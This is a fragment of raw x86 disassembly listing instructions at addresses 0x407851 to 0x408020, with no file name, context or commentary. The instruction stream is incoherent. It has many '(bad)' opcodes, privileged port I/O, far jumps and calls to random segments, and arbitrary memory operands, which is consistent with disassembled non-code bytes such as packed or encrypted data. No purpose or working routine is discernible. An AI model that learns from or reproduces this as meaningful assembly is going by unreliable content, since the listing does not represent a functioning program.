  407851:	lahf   
  407852:	xor    al,0x6e
  407854:	dec    esp
  407855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407856:	into   
  407857:	iret   
  407858:	sti    
  407859:	xchg   ebx,eax
  40785a:	leave  
  40785b:	or     DWORD PTR [edx+eax*4],ebp
  40785e:	sbb    al,0x17
  407860:	shr    DWORD PTR [edi-0x7b4f5dba],0xc2
  407867:	stc    
  407868:	cmp    DWORD PTR [eax],ecx
  40786a:	mov    ecx,DWORD PTR [edx]
  40786c:	std    
  40786d:	in     eax,dx
  40786e:	sbb    eax,0xc3bb8dc4
  407873:	lock jo 0x407828
  407876:	jae    0x40787b
  407878:	dec    edx
  407879:	or     DWORD PTR [edi],0x6d8ba346
  40787f:	nop
  407880:	stos   DWORD PTR es:[edi],eax
  407881:	jl     0x407865
  407883:	pushf  
  407884:	sbb    DWORD PTR [edx+0x58173999],eax
  40788a:	push   cs
  40788b:	pop    es
  40788c:	sub    bh,bh
  40788e:	aaa    
  40788f:	xchg   BYTE PTR [eax+edi*4],ah
  407892:	out    dx,al
  407893:	repnz push eax
  407895:	mov    ds:0xc60205d0,eax
  40789a:	pop    edi
  40789b:	inc    edx
  40789c:	or     eax,0x45aa6ad7
  4078a1:	adc    al,0x95
  4078a3:	cmp    BYTE PTR ds:0xcd7b6448,ch
  4078a9:	xchg   DWORD PTR [ebx+0x1b],edx
  4078ac:	mov    bl,0x2c
  4078ae:	dec    eax
  4078af:	xor    DWORD PTR [edx-0x38ac66c3],0xb7e740be
  4078b9:	xor    DWORD PTR [ebp-0x3122161c],edi
  4078bf:	jle    0x40785a
  4078c1:	push   ebx
  4078c2:	mov    al,ds:0xe1cadf21
  4078c7:	fidivr WORD PTR [ecx-0x637f6df8]
  4078cd:	push   ecx
  4078ce:	and    al,0x3b
  4078d0:	adc    ebp,DWORD PTR [esi-0x2383334a]
  4078d6:	fwait
  4078d7:	xor    eax,0x89958551
  4078dc:	test   eax,0x1d542ab1
  4078e1:	jns    0x407869
  4078e3:	mov    DWORD PTR [eax],0x1c09cc42
  4078e9:	adc    al,0x40
  4078ec:	pop    edi
  4078ed:	ja     0x407888
  4078ef:	sbb    DWORD PTR [ebp-0x2d],ecx
  4078f2:	popa   
  4078f3:	jns    0x407878
  4078f5:	test   al,0x65
  4078f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f8:	push   eax
  4078f9:	push   cs
  4078fa:	push   edx
  4078fb:	iret   
  4078fc:	sbb    DWORD PTR [esi+eax*4+0x7b23784e],0x9bba4cc8
  407907:	nop
  407908:	inc    esp
  407909:	push   esi
  40790a:	int    0x7
  40790c:	sbb    eax,DWORD PTR [edx-0x4]
  40790f:	jo     0x40798b
  407911:	jmp    0x230d:0xcc335bf4
  407918:	hlt    
  407919:	push   edi
  40791a:	jo     0x4078ff
  40791c:	mov    DWORD PTR [edx+0x59],ebx
  40791f:	or     BYTE PTR [esi],0x26
  407922:	fisttp WORD PTR [edi+0x17966367]
  407928:	dec    ebp
  407929:	adc    DWORD PTR [edi-0x70c7ef9f],0x75186f48
  407933:	jns    0x40795e
  407935:	push   ebx
  407936:	or     DWORD PTR [esi-0x29],esi
  407939:	mov    eax,ds:0x89cbc373
  40793e:	xor    eax,0xce7d0410
  407943:	leave  
  407944:	leave  
  407945:	mov    cl,0xf1
  407947:	mov    esp,DWORD PTR [edi-0x19]
  40794a:	shr    ch,0x16
  40794d:	adc    BYTE PTR [ebp+0x54],al
  407950:	mov    dl,0x83
  407952:	pop    ds
  407953:	push   eax
  407954:	in     al,0x8b
  407956:	adc    BYTE PTR [eax-0x2ea3e4c9],dl
  40795c:	dec    eax
  40795d:	jns    0x407905
  40795f:	jg     0x40795e
  407961:	dec    eax
  407962:	mov    esi,0xb1302a81
  407967:	adc    bh,BYTE PTR [ebx]
  407969:	(bad)  
  40796a:	jmp    0x40791a
  40796c:	push   cs
  40796d:	mov    ah,0x81
  40796f:	push   esi
  407970:	sar    BYTE PTR [edi+0x1eaf384],0x16
  407977:	loopne 0x407934
  407979:	and    BYTE PTR [edx],ch
  40797b:	jne    0x40799f
  40797d:	cmp    ebp,esp
  40797f:	jge    0x4079d8
  407981:	les    edx,FWORD PTR [ebp-0x449493d1]
  407987:	mov    eax,ds:0x8b470e4c
  40798c:	int    0x43
  40798e:	jl     0x407998
  407990:	jno    0x407a0a
  407992:	jp     0x407961
  407994:	mov    cl,0xb
  407996:	cmp    BYTE PTR [ecx+0x6e],ah
  407999:	push   ds
  40799a:	xlat   BYTE PTR ds:[ebx]
  40799b:	out    0x18,al
  40799d:	jnp    0x40793e
  40799f:	lahf   
  4079a0:	mov    eax,0x1741c631
  4079a5:	jbe    0x40794a
  4079a7:	fsubr  DWORD PTR [esi-0x495d03ef]
  4079ad:	ins    BYTE PTR es:[edi],dx
  4079ae:	adc    BYTE PTR [edx+0x1031c32e],0xba
  4079b5:	and    al,BYTE PTR [eax]
  4079b7:	mov    edi,0xa9f2aba7
  4079bc:	pop    edx
  4079bd:	and    al,0x46
  4079bf:	xor    BYTE PTR [esi],bl
  4079c1:	mov    cs,WORD PTR [ebp-0x72]
  4079c4:	ins    BYTE PTR es:[edi],dx
  4079c5:	loop   0x407964
  4079c7:	call   0xcf22:0x29454675
  4079ce:	sbb    DWORD PTR [ebp+0x19e5fd5c],eax
  4079d4:	cmp    BYTE PTR [esi-0x66],ah
  4079d7:	aas    
  4079d8:	leave  
  4079d9:	dec    ecx
  4079da:	jg     0x407a48
  4079dc:	mov    ah,0x52
  4079de:	aam    0x20
  4079e0:	shl    DWORD PTR [edi-0x7a],0x53
  4079e4:	inc    edi
  4079e5:	push   0xcdb5d4f5
  4079ea:	retf   
  4079eb:	shl    BYTE PTR [esp+ebp*2+0x4b192559],0x70
  4079f3:	das    
  4079f4:	ret    0xfd3b
  4079f7:	and    bl,BYTE PTR [ebx-0x674785db]
  4079fd:	scas   al,BYTE PTR es:[edi]
  4079fe:	ins    DWORD PTR es:[edi],dx
  4079ff:	movntps XMMWORD PTR [ecx-0x49],xmm5
  407a03:	test   DWORD PTR [edx],ebp
  407a05:	dec    esi
  407a06:	(bad)  
  407a08:	inc    eax
  407a09:	adc    eax,0x1e7a6025
  407a0e:	in     eax,dx
  407a0f:	int3   
  407a10:	or     dl,al
  407a12:	scas   al,BYTE PTR es:[edi]
  407a13:	(bad)  
  407a14:	jmp    0x3992:0x917f72ca
  407a1b:	mov    ebx,0x1779d842
  407a20:	push   0x3fbfec1a
  407a25:	jmp    0xa6015caa
  407a2a:	sbb    DWORD PTR [ebp+0x2939cf7c],ebx
  407a30:	mov    al,ds:0xfbfe8472
  407a35:	mov    al,0x75
  407a37:	or     eax,0xc6887d9b
  407a3c:	ss jl  0x407a77
  407a3f:	sub    DWORD PTR [ebp-0x29],esp
  407a42:	(bad)  
  407a43:	pop    ds
  407a44:	repnz daa 
  407a46:	dec    edi
  407a47:	mov    dh,0x18
  407a49:	ret    
  407a4a:	ins    BYTE PTR es:[edi],dx
  407a4b:	not    DWORD PTR [esi+0x7afce720]
  407a51:	xchg   esi,eax
  407a52:	mov    edi,0xc147d567
  407a57:	sbb    DWORD PTR [esi+0xd],0x57
  407a5b:	cld    
  407a5c:	jo     0x407a2c
  407a5e:	bound  ebp,QWORD PTR ds:0x1ba7724
  407a64:	cld    
  407a65:	pop    esi
  407a66:	xor    eax,DWORD PTR [edx+eax*1+0x613e80f1]
  407a6d:	cdq    
  407a6e:	push   0xfaf886ff
  407a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a74:	outs   dx,DWORD PTR ds:[esi]
  407a75:	pop    ss
  407a76:	xor    al,0x53
  407a78:	call   0x3a7c:0xa04cdaf
  407a7f:	mov    WORD PTR [esp+edx*1+0x4f],ss
  407a83:	sbb    BYTE PTR [ebp-0x6e],dl
  407a86:	xor    BYTE PTR [ecx-0x7764feec],bl
  407a8c:	sub    ah,ah
  407a8e:	jl     0x407a5b
  407a90:	outs   dx,BYTE PTR ds:[esi]
  407a91:	mov    WORD PTR [edi+0x42],cs
  407a94:	adc    BYTE PTR [edi],0x4e
  407a97:	ret    0x1364
  407a9a:	ret    0x74b0
  407a9d:	and    DWORD PTR [ebx+0x5e],esi
  407aa0:	stos   DWORD PTR es:[edi],eax
  407aa1:	out    dx,eax
  407aa2:	pop    ecx
  407aa3:	rol    DWORD PTR [edx+0x5fffa0fd],cl
  407aa9:	dec    esi
  407aaa:	test   BYTE PTR [ebp-0x6b],ch
  407aad:	pushf  
  407aae:	ret    0x8d8a
  407ab1:	pop    ebx
  407ab2:	jne    0x407ac7
  407ab4:	imul   esp,DWORD PTR [edx+eiz*1],0x1ed7169a
  407abb:	pop    esp
  407abc:	mov    ch,0x77
  407abe:	jmp    0x407a77
  407ac0:	sbb    eax,ecx
  407ac2:	out    dx,al
  407ac3:	xchg   ebp,eax
  407ac4:	cs loope 0x407b33
  407ac7:	lods   eax,DWORD PTR ds:[esi]
  407ac8:	rol    BYTE PTR [ecx+0x9],1
  407acb:	jp     0x407ab9
  407acd:	mov    al,ds:0xa308bb9f
  407ad2:	in     eax,dx
  407ad3:	xor    edx,DWORD PTR [ecx]
  407ad5:	mov    ax,0xc574
  407ad9:	xlat   BYTE PTR ds:[ebx]
  407ada:	dec    esi
  407adb:	out    dx,al
  407adc:	fs jne 0x407af5
  407adf:	pop    ecx
  407ae0:	xchg   ecx,eax
  407ae1:	pop    ebx
  407ae2:	sbb    eax,0xc986bb7f
  407ae7:	pop    ecx
  407ae8:	add    eax,0x887255d0
  407aed:	fs mov ebp,0xe0fad26
  407af3:	push   cs
  407af4:	dec    edi
  407af5:	inc    eax
  407af6:	aam    0x93
  407af8:	stos   DWORD PTR es:[edi],eax
  407af9:	jp     0x407ad6
  407afb:	mov    al,ds:0xb388a3da
  407b00:	push   0xafe6301d
  407b05:	pop    ecx
  407b06:	sub    dl,ch
  407b08:	xor    esp,DWORD PTR [edx+0x16d080c9]
  407b0e:	push   eax
  407b0f:	out    dx,eax
  407b10:	xlat   BYTE PTR ds:[ebx]
  407b11:	fdiv   st(7),st
  407b13:	call   0x9445f574
  407b18:	ror    DWORD PTR [ecx-0x5194eedb],cl
  407b1e:	pop    ds
  407b1f:	sbb    eax,0x3031467c
  407b24:	jle    0x407b24
  407b26:	mov    ch,0x57
  407b28:	mov    bl,0x71
  407b2a:	mov    ecx,0xc07e3726
  407b2f:	jne    0x407ab4
  407b31:	mov    eax,DWORD PTR [eax+0x72]
  407b34:	or     eax,0x98a189d
  407b39:	push   ecx
  407b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b3b:	into   
  407b3c:	shl    BYTE PTR [esi-0xe863029],1
  407b42:	push   cs
  407b43:	daa    
  407b44:	gs push ebp
  407b46:	loope  0x407aee
  407b48:	sbb    DWORD PTR ds:0xeec989fa,esp
  407b4e:	mov    dl,0xcd
  407b50:	sti    
  407b51:	xor    bl,bh
  407b53:	call   0x4843:0x4b6280e8
  407b5a:	push   eax
  407b5b:	jg     0x407b8d
  407b5d:	sub    al,0xb8
  407b5f:	(bad)  
  407b60:	mov    cl,BYTE PTR [ebp+0x29ac9eca]
  407b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b67:	(bad)
  407b6b:	test   eax,0xca287bf8
  407b70:	mov    si,0x2780
  407b74:	push   ds
  407b75:	jnp    0x407bb6
  407b77:	jmp    0x9246:0x5d31d97a
  407b7e:	(bad)  
  407b7f:	xchg   esp,eax
  407b80:	in     eax,0xda
  407b82:	ja     0x407b43
  407b84:	push   esi
  407b85:	pop    eax
  407b86:	cmp    DWORD PTR [ecx+ebp*8],0x7218fb4d
  407b8d:	lea    esi,[ebp+0x4]
  407b90:	repz sbb BYTE PTR fs:[ecx+0x13],0x6e
  407b96:	fist   WORD PTR [ecx+0x29ef974a]
  407b9c:	xor    dl,cl
  407b9e:	and    BYTE PTR [ebx],dh
  407ba0:	pop    ds
  407ba1:	fs cmp eax,0x74b7572c
  407ba7:	mov    ah,0xf3
  407ba9:	mov    dh,0x19
  407bab:	popa   
  407bac:	mov    es,esp
  407bae:	not    BYTE PTR [eax-0x22958c48]
  407bb4:	push   esi
  407bb5:	punpckhbw mm5,QWORD PTR [ebx+eiz*4-0x228fcd4]
  407bbd:	outs   dx,DWORD PTR ds:[esi]
  407bbe:	cli    
  407bbf:	mov    esp,0x818b31
  407bc4:	fidivr WORD PTR [edi-0x6]
  407bc7:	xor    cl,BYTE PTR [edx+0x61]
  407bca:	lods   eax,DWORD PTR ds:[esi]
  407bcb:	xchg   edx,eax
  407bcc:	push   edx
  407bcd:	push   cs
  407bce:	jne    0x407bbf
  407bd0:	mov    ebp,0xa17cd798
  407bd5:	ret    0xe122
  407bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd9:	cli    
  407bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bdb:	hlt    
  407bdc:	cmc    
  407bdd:	sub    BYTE PTR [ecx-0x344fe966],dh
  407be3:	les    esp,FWORD PTR [ecx-0x47d2d6cb]
  407be9:	xchg   esi,eax
  407bea:	xlat   BYTE PTR ds:[ebx]
  407beb:	out    dx,al
  407bec:	mov    eax,ds:0x62d71353
  407bf1:	cmp    DWORD PTR [ecx-0x51],esp
  407bf4:	mov    ch,0xf4
  407bf6:	dec    ebp
  407bf7:	test   eax,0x2347801c
  407bfc:	jmp    0x407bae
  407bfe:	xor    al,0xd0
  407c00:	hlt    
  407c01:	fidiv  WORD PTR [edx]
  407c03:	and    al,0x41
  407c05:	clc    
  407c06:	jmp    0x59c1:0xcb661ed8
  407c0d:	cmp    dl,al
  407c0f:	xor    BYTE PTR [edx+esi*4+0x4c67aaea],dh
  407c16:	mov    dl,0xec
  407c18:	sub    DWORD PTR [edi+0x61],ebx
  407c1b:	sub    al,0x2
  407c1d:	call   0x1c105abc
  407c22:	adc    edi,ebp
  407c24:	sbb    al,0xd8
  407c26:	repz push ecx
  407c28:	mov    eax,ds:0xc88649ed
  407c2d:	(bad)  
  407c2e:	cmp    ah,ah
  407c30:	loop   0x407bcd
  407c32:	mov    al,0xbf
  407c34:	aaa    
  407c35:	jecxz  0x407c0a
  407c37:	xchg   ecx,eax
  407c38:	mov    al,ds:0xaccdf182
  407c3d:	xchg   edi,ecx
  407c3f:	add    DWORD PTR [edi],ebx
  407c41:	cdq    
  407c42:	in     eax,dx
  407c43:	inc    edx
  407c44:	push   eax
  407c45:	xor    BYTE PTR [esi],bh
  407c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c48:	shl    DWORD PTR [esp+eiz*4-0x4907ee01],0x5c
  407c50:	je     0x407c7d
  407c52:	pop    ebp
  407c53:	jl     0x407c89
  407c55:	mov    eax,ds:0x97d6abb
  407c5a:	pop    eax
  407c5b:	adc    dl,BYTE PTR [esi]
  407c5d:	nop
  407c5e:	mov    al,ds:0x5b35d3f5
  407c63:	fs jb  0x407c0a
  407c66:	mov    ebp,0xe5299461
  407c6b:	add    DWORD PTR [ebp-0x2bdf76b9],eax
  407c71:	shr    BYTE PTR [edx],cl
  407c73:	call   0xaef6:0x48ce5b0f
  407c7a:	enter  0xc021,0x98
  407c7e:	push   cs
  407c7f:	sub    ebp,eax
  407c81:	xchg   esp,eax
  407c82:	inc    BYTE PTR [ecx]
  407c84:	dec    esi
  407c85:	loope  0x407c81
  407c87:	xchg   edx,eax
  407c88:	shl    cl,1
  407c8a:	xchg   esp,eax
  407c8b:	adc    ch,BYTE PTR [esi+edx*1+0xc]
  407c8f:	xchg   edi,eax
  407c90:	dec    esp
  407c91:	pop    ecx
  407c92:	cdq    
  407c93:	mov    cl,0xc1
  407c95:	mov    cl,0xa7
  407c97:	(bad)  
  407c98:	adc    edx,DWORD PTR [esi]
  407c9a:	xchg   ebp,eax
  407c9b:	inc    esp
  407c9c:	hlt    
  407c9d:	push   edx
  407c9e:	out    0x38,eax
  407ca0:	cwde   
  407ca1:	inc    eax
  407ca2:	sub    BYTE PTR [ebx+0x40b9adf0],bl
  407ca8:	dec    ebp
  407ca9:	in     al,dx
  407caa:	fbld   TBYTE PTR [edi+0x1e9a2009]
  407cb0:	lock xchg ebp,eax
  407cb2:	lahf   
  407cb3:	test   eax,0x1f619ae1
  407cb8:	fisub  DWORD PTR [edi]
  407cba:	pop    es
  407cbb:	imul   ecx,DWORD PTR [ecx-0x6d5a3883],0xffffffc2
  407cc2:	push   esp
  407cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc4:	das    
  407cc5:	(bad)  
  407cc6:	pop    edx
  407cc7:	repz imul eax,DWORD PTR [ebp+0x1ae3230d],0x687c071
  407cd2:	xchg   edi,eax
  407cd3:	adc    eax,0xbf1f7acb
  407cd8:	xor    bl,BYTE PTR [edi+0x2]
  407cdb:	sti    
  407cdc:	sub    dh,dl
  407cde:	mov    ebp,0xb3c8d584
  407ce3:	or     al,0x2c
  407ce5:	mov    BYTE PTR [edi+0x3],bh
  407ce8:	mov    edx,0x1f886ee3
  407ced:	push   0xffffffa3
  407cef:	aam    0x9d
  407cf1:	and    DWORD PTR [ecx-0x49],esi
  407cf4:	lahf   
  407cf5:	addr16 mov ebx,0xe66596c3
  407cfb:	pushf  
  407cfc:	outs   dx,DWORD PTR ds:[esi]
  407cfd:	pop    ebp
  407cfe:	sub    cl,BYTE PTR [eax]
  407d00:	mov    bh,0xdc
  407d02:	xchg   ebx,eax
  407d03:	test   al,0x2
  407d05:	mov    edx,cs
  407d07:	mov    bl,0x8b
  407d09:	push   ds
  407d0a:	out    0x6b,eax
  407d0c:	(bad)  [ecx]
  407d0e:	xor    al,BYTE PTR [ecx+0x5c]
  407d11:	inc    edi
  407d12:	ss loope 0x407d3c
  407d15:	push   ecx
  407d16:	jnp    0x407c9f
  407d18:	pop    esi
  407d19:	pushf  
  407d1a:	popf   
  407d1b:	std    
  407d1c:	mov    esi,0x8b2cc65e
  407d21:	or     cl,BYTE PTR [edx+edi*2-0x5451b6d8]
  407d28:	inc    edx
  407d29:	lds    ebx,FWORD PTR [edi-0x64]
  407d2c:	sahf   
  407d2d:	bound  eax,QWORD PTR [edi+0x3942c7ab]
  407d33:	rcl    BYTE PTR [ebx],cl
  407d35:	dec    ecx
  407d36:	and    eax,0xdc8eefb7
  407d3b:	leave  
  407d3c:	mov    dh,0x57
  407d3e:	mov    dl,0xe6
  407d40:	and    cl,BYTE PTR [ecx+0x79ffbeb2]
  407d46:	ins    BYTE PTR es:[edi],dx
  407d47:	add    edx,eax
  407d49:	ss pop eax
  407d4b:	jae    0x407d4e
  407d4d:	pop    eax
  407d4e:	mov    ah,0x79
  407d50:	mov    dl,0xd8
  407d52:	cwde   
  407d53:	mov    ebx,0xc94dc2cd
  407d58:	dec    eax
  407d59:	add    al,0x89
  407d5b:	jae    0x407d37
  407d5d:	sub    al,0x9d
  407d5f:	cs pop ecx
  407d61:	xor    DWORD PTR [edi-0x4e03dd15],eax
  407d67:	(bad)  
  407d68:	mov    ds:0xd6b00778,al
  407d6d:	inc    ebx
  407d6e:	or     DWORD PTR [edi+0x6a],edi
  407d71:	push   es
  407d72:	mov    es,WORD PTR [ebp+0x40]
  407d75:	sar    bl,cl
  407d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d78:	sub    BYTE PTR [eax+0x11],dh
  407d7b:	add    ch,dl
  407d7d:	pop    esp
  407d7e:	shl    ecx,cl
  407d80:	or     DWORD PTR [ebx+0x19c05ee1],esi
  407d86:	pop    eax
  407d87:	outs   dx,BYTE PTR ds:[esi]
  407d88:	dec    ebp
  407d89:	sbb    bl,bl
  407d8b:	test   DWORD PTR ds:0x46ff3840,0x5e1395bb
  407d95:	push   eax
  407d96:	in     al,dx
  407d97:	sbb    ebp,DWORD PTR [eax-0x6c1cf03d]
  407d9d:	hlt    
  407d9e:	pushf  
  407d9f:	in     al,0x80
  407da1:	outs   dx,DWORD PTR ds:[esi]
  407da2:	dec    BYTE PTR [eax+0x1c90f08c]
  407da8:	inc    ebp
  407da9:	addr16 aad 0x64
  407dac:	mov    WORD PTR [ebp+0x3ad6e882],?
  407db2:	cmp    BYTE PTR [esp+eiz*2+0x79],bl
  407db6:	ss push es
  407db8:	mov    bl,0x48
  407dba:	pop    esi
  407dbb:	mov    ecx,0xe7f018dd
  407dc0:	mov    ebx,0xc70efd12
  407dc5:	add    eax,0x7c47973a
  407dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dcb:	and    dh,BYTE PTR [eax]
  407dcd:	dec    edi
  407dce:	iret   
  407dcf:	in     al,0x5
  407dd1:	ins    BYTE PTR es:[edi],dx
  407dd2:	out    0xdb,eax
  407dd4:	fs stos DWORD PTR es:[edi],eax
  407dd6:	iret   
  407dd7:	jl     0x407dc2
  407dd9:	addr16 adc esp,esi
  407ddc:	jg     0x407dc5
  407dde:	stos   BYTE PTR es:[edi],al
  407ddf:	test   eax,0x45d7b8c2
  407de4:	test   al,0xf2
  407de6:	mov    DWORD PTR [ebp-0x5d3881bd],esi
  407dec:	cld    
  407ded:	xor    BYTE PTR [edx+0x5b5d1aeb],cl
  407df3:	les    ecx,FWORD PTR [esi-0x75972174]
  407df9:	rol    DWORD PTR [ebp-0x6a],0x3e
  407dfd:	xchg   edx,eax
  407dfe:	(bad)  
  407dff:	into   
  407e00:	(bad)  
  407e01:	pop    esi
  407e02:	add    cl,BYTE PTR [ecx-0xf]
  407e05:	addr16 push eax
  407e07:	sti    
  407e08:	(bad)  
  407e09:	icebp  
  407e0a:	xchg   esp,eax
  407e0b:	add    eax,0x5a80fa31
  407e10:	inc    ebx
  407e11:	fld    st(2)
  407e13:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407e15:	hlt    
  407e16:	loop   0x407e8a
  407e18:	shl    BYTE PTR [ecx+0x7],1
  407e1b:	enter  0xa380,0x21
  407e1f:	pushw  ds
  407e21:	test   DWORD PTR [ebx],eax
  407e23:	retf   0xcca4
  407e26:	add    al,0x42
  407e28:	mul    BYTE PTR [ecx]
  407e2a:	fwait
  407e2b:	push   edx
  407e2c:	int    0x20
  407e2e:	ja     0x407e14
  407e30:	cmp    ch,BYTE PTR [edi+0x19227e41]
  407e36:	adc    ecx,DWORD PTR fs:[eax+0x2b57ca48]
  407e3d:	jae    0x407dd2
  407e3f:	cld    
  407e40:	jecxz  0x407eba
  407e42:	repnz cmp BYTE PTR [edx-0x9],0x24
  407e47:	push   es
  407e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e49:	dec    eax
  407e4a:	push   ecx
  407e4b:	sbb    al,0x6a
  407e4d:	jle    0x407e95
  407e4f:	mov    eax,ds:0xb4f96939
  407e54:	mov    bl,0xbc
  407e56:	imul   edx,DWORD PTR [esi+0x70],0x50
  407e5a:	enter  0xb5f2,0x78
  407e5e:	jle    0x407e40
  407e60:	pop    ss
  407e61:	sbb    al,BYTE PTR fs:[esi+ebp*8]
  407e65:	jns    0x407e7b
  407e67:	iret   
  407e68:	or     cl,ah
  407e6a:	push   esp
  407e6b:	vpunpckhdq ymm1,ymm3,ymm1
  407e6f:	pop    eax
  407e70:	pop    esi
  407e71:	dec    edx
  407e72:	adc    ebx,ebx
  407e74:	enter  0xb05,0xad
  407e78:	xchg   ebp,eax
  407e79:	ret    0x5707
  407e7c:	pushf  
  407e7d:	mov    eax,0x1504a47
  407e82:	jmp    0x6f42:0x7a8e7756
  407e89:	sub    eax,0x22e8e953
  407e8e:	pop    eax
  407e8f:	fsub   DWORD PTR [ebx-0x34]
  407e92:	mov    ds:0xd2da57d4,eax
  407e97:	push   cs
  407e98:	xchg   esp,eax
  407e99:	pop    esi
  407e9a:	inc    edi
  407e9b:	sbb    DWORD PTR [eax-0x62],eax
  407e9e:	les    ecx,FWORD PTR [esp+eax*2-0x57366fb2]
  407ea5:	je     0x407f14
  407ea7:	cs pop es
  407ea9:	pop    eax
  407eaa:	dec    eax
  407eab:	mov    dh,0x76
  407ead:	xchg   edi,eax
  407eae:	mov    cs,WORD PTR [ecx]
  407eb0:	pop    ebp
  407eb1:	fwait
  407eb2:	sub    dh,dh
  407eb4:	sbb    bl,bl
  407eb6:	retf   
  407eb7:	sbb    BYTE PTR [eax+0x4b0a41c6],dl
  407ebd:	icebp  
  407ebe:	scas   eax,DWORD PTR es:[edi]
  407ebf:	ins    BYTE PTR es:[edi],dx
  407ec0:	and    al,0xe6
  407ec2:	aam    0x0
  407ec4:	mov    eax,0xc25c4048
  407ec9:	into   
  407eca:	retf   
  407ecb:	mov    bl,0x9c
  407ecd:	and    al,0x5e
  407ecf:	stos   DWORD PTR es:[edi],eax
  407ed0:	jl     0x407f20
  407ed2:	into   
  407ed3:	gs jmp 0x407e8a
  407ed6:	sti    
  407ed7:	imul   esi,ecx,0x7
  407eda:	arpl   WORD PTR [ecx],ax
  407edc:	fidivr DWORD PTR [edx+0x310b0231]
  407ee2:	jge    0x407f13
  407ee4:	test   al,0x76
  407ee6:	mov    bl,0x24
  407ee8:	ja     0x407f2d
  407eea:	push   eax
  407eeb:	inc    ebx
  407eec:	ret    0x234a
  407eef:	jp     0x407e96
  407ef1:	mov    eax,ds:0xe7b5543e
  407ef6:	push   ebp
  407ef7:	ret    
  407ef8:	jno    0x407ee3
  407efa:	ins    DWORD PTR es:[edi],dx
  407efb:	cmp    al,0xbc
  407efd:	cmp    al,0x78
  407eff:	adc    bh,BYTE PTR [ecx]
  407f01:	mov    BYTE PTR [ecx-0xd],dh
  407f04:	push   0x2b761331
  407f09:	js     0x407ef9
  407f0b:	pop    eax
  407f0c:	sti    
  407f0d:	clc    
  407f0e:	fucomp st(7)
  407f10:	fstp   TBYTE PTR [esi]
  407f12:	sbb    eax,0x2aba396e
  407f17:	in     eax,dx
  407f18:	das    
  407f19:	jo     0x407e9c
  407f1b:	mov    ds:0x41906d47,eax
  407f20:	xchg   esp,eax
  407f21:	sar    DWORD PTR [esi],cl
  407f23:	aad    0x29
  407f25:	inc    ecx
  407f26:	or     al,0xb6
  407f28:	push   ds
  407f29:	dec    eax
  407f2a:	loope  0x407f82
  407f2c:	or     eax,0xd5346ee2
  407f31:	pop    ecx
  407f32:	cmp    DWORD PTR [edx+0x795de541],eax
  407f38:	bound  ebx,QWORD PTR [ebp+0x72dfffc5]
  407f3e:	imul   esp,DWORD PTR [edi+0x12],0x7b203afb
  407f45:	or     ecx,esi
  407f47:	jle    0x407f1f
  407f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f4a:	test   esp,esi
  407f4c:	js     0x407f8a
  407f4e:	mov    al,0x2
  407f50:	or     esp,eax
  407f52:	les    eax,FWORD PTR ds:0xa659ca90
  407f58:	or     edx,DWORD PTR [eax+0x6cb27935]
  407f5e:	jo     0x407ee5
  407f60:	add    ecx,edi
  407f62:	dec    eax
  407f63:	ins    DWORD PTR es:[edi],dx
  407f64:	aaa    
  407f65:	cs clc 
  407f67:	cs (bad) 
  407f69:	repz adc BYTE PTR [edi-0x69],0x55
  407f6e:	jae    0x407fdf
  407f70:	pop    ss
  407f71:	mov    edx,0xb078065f
  407f76:	sub    ecx,DWORD PTR [ebx-0x4f]
  407f79:	sar    DWORD PTR [edi-0x56],cl
  407f7c:	add    eax,DWORD PTR [ecx-0x459496e5]
  407f82:	fcmove st,st(2)
  407f84:	adc    BYTE PTR [eax-0x64],cl
  407f87:	jo     0x407fa9
  407f89:	xor    ebp,DWORD PTR [esi]
  407f8b:	mov    ds:0x940debf1,al
  407f90:	adc    al,0xce
  407f92:	nop
  407f93:	rcr    DWORD PTR [ecx+ebx*1-0x3e99e8a],cl
  407f9a:	push   es
  407f9b:	push   ds
  407f9c:	mov    esi,0xbfa74f1
  407fa1:	pop    es
  407fa2:	inc    edi
  407fa3:	add    al,0x72
  407fa5:	mov    al,ds:0xb25d8942
  407faa:	ret    
  407fab:	push   ds
  407fac:	mov    eax,ds:0x2be79f0f
  407fb1:	and    cl,BYTE PTR [ecx-0x3ef68dcf]
  407fb7:	mov    ds:0xa1de3264,al
  407fbc:	imul   BYTE PTR [ecx]
  407fbe:	or     eax,0x1fdb5966
  407fc3:	pop    DWORD PTR [eax-0x21]
  407fc6:	adc    ebp,ebp
  407fc8:	sbb    esi,DWORD PTR [edx-0xd]
  407fcb:	jb     0x407f70
  407fcd:	xor    eax,0x6d873b9a
  407fd2:	jl     0x408049
  407fd4:	mov    ch,0x2a
  407fd6:	je     0x40801d
  407fd8:	jno    0x407f7f
  407fda:	cmp    al,0x43
  407fdc:	xchg   ebp,eax
  407fdd:	(bad)  
  407fde:	loopne 0x407fa4
  407fe0:	mov    al,0xc2
  407fe2:	adc    eax,0x3b93fb6e
  407fe7:	dec    esp
  407fe8:	cmp    al,0xa6
  407fea:	xchg   edx,eax
  407feb:	dec    ecx
  407fec:	bound  eax,QWORD PTR [ebp-0x3f29650e]
  407ff2:	(bad)  
  407ff3:	repnz dec eax
  407ff5:	out    dx,eax
  407ff6:	mov    cl,0x2
  407ff8:	ins    DWORD PTR es:[edi],dx
  407ff9:	out    dx,al
  407ffa:	xlat   BYTE PTR ds:[ebx]
  407ffb:	nop
  407ffc:	test   eax,0x577fe7e3
  408001:	sub    al,0xd9
  408003:	add    BYTE PTR [esi],0x85
  408006:	mov    esp,DWORD PTR [ecx+0x2aa8898]
  40800c:	push   ecx
  40800d:	imul   eax,ecx,0x74
  408010:	fnstsw WORD PTR [ecx+0x5b82527e]
  408016:	in     al,0xde
  408018:	fsub   st,st(4)
  40801a:	in     al,dx
  40801b:	dec    edx
  40801c:	es dec esi
  40801e:	icebp  
  40801f:	inc    esi
  408020:	adc    eax,0xaad79171
